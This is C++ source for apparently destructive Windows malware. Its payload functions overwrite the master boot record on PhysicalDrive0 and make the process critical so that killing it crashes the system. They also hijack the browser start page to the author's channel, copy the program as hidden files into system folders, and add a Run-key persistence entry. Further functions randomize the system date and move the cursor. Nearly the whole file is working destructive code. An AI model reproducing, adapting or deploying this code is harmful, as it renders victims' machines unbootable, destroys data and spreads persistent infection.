#include "System.h"
#include "Buffer.hpp"
#include <windows.h>
typedef struct IUnknown IUnknown;

extern "C" {
	// EXTERNING NTDLL FUNCTIONS //
	
	// EXTERN RTLADJUSTPRIVILEGE
	NTSTATUS WINAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, BYTE*);
	// EXTERN NTRAISEHARDERROR
	NTSTATUS WINAPI NtRaiseHardError(NTSTATUS, DWORD, DWORD, UINT64*, DWORD, DWORD*);
}

typedef void(_stdcall* RTLPROCESSCRITICAL) (IN BYTE NewValue, OUT LPBYTE OldValue, IN BYTE IsWinlogon);

WINBOOL EnablePrivs(LPCWSTR lpprivs) {
	HANDLE htk;
	LUID luid;
	TOKEN_PRIVILEGES token;
	RtlZeroMemory(&token, sizeof(token));
	
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY), &htk)) return false;
	if (!LookupPrivilegeValueW(NULL, lpprivs, &luid)) {
		CloseHandle(htk);
		return false;
	}
	
	token.PrivilegeCount = 1;
	token.Privileges[0].Luid = luid;
	token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	BOOL bret = AdjustTokenPrivileges(htk, false, &token, sizeof(token), NULL, NULL);
	CloseHandle(htk);
	return bret;
}


namespace Payloads {
	
	VOID OverwriteMBR(VOID) {
		// MBR OVERWRITER //
		DWORD dwWriteBytes;
		HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (hDrive == INVALID_HANDLE_VALUE) exit(0);
		WriteFile(hDrive, rawData, 512, &dwWriteBytes, NULL);
		CloseHandle(hDrive);
	}
	
	
	WINBOOL SetCritProcess(void) {
		// SET AS CRITICAL PROCESS //
		// Recycled from Dingaling
		
		HANDLE hlib;
		RTLPROCESSCRITICAL SetCritiProcess;
		
		hlib = LoadLibraryW(L"ntdll.dll");
		if (hlib != NULL) {
			EnablePrivs(L"SeDebugPrivilege");
			(SetCritiProcess) = (RTLPROCESSCRITICAL)GetProcAddress((HINSTANCE)hlib, "RtlSetProcessIsCritical");
			if (!SetCritiProcess) return 0;
			SetCritiProcess(1, 0, 0);
			return 1;
		}
		else return 0;
	}
	
	VOID StartPageChanger(VOID) {
		// CHANGES THE START PAGE TO MY CHANNEL //
		System::ManageRegW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\Internet Explorer\\Main", L"Start Page", 0, 0, L"https://youtube.com/@NotCCR", true, true);
	}
	
	VOID InfectSystem(VOID) {
		// SELF-REPLICATION //
		LPCWSTR pwszPaths[] = {
			L"C:\\WINDOWS\\System32\\OOBE\\images\\Invert.bmp.exe",
			L"C:\\Program Files\\Internet Explorer\\Connection Wizard\\servers.exe",
			L"C:\\WINDOWS\\System32\\Sophther.exe",
			L"C:\\WINDOWS\\booto.dat"
		};
		for (int t = 0; t < _countof(pwszPaths); t++) {
			System::CopyFileExr(GetDir(), pwszPaths[t], FILE_ATTRIBUTE_HIDDEN);
			System::ManageRegW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"Depression Service", 0, 0, pwszPaths[2], false, true);
		}
	}
	
	DWORD WINAPI RandomTime(LPVOID pvoid) {
		// RANDOM DATE //
		while (true) {
			System::SetSystemDateEx(rand() % 26 + 1999, rand() % 12 + 1, rand() % 28 + 1);
			Sleep(10);
		}
	}
	
	DWORD WINAPI CursorPos(LPVOID pvoid) {
		// CURSOR POSITION GOING UP //
		while (true) {
			POINT cpt;
			int y = cpt.y + 2;
			SetCursorPos((int)cpt.x, y);
			Sleep(10);
		}
	}
}
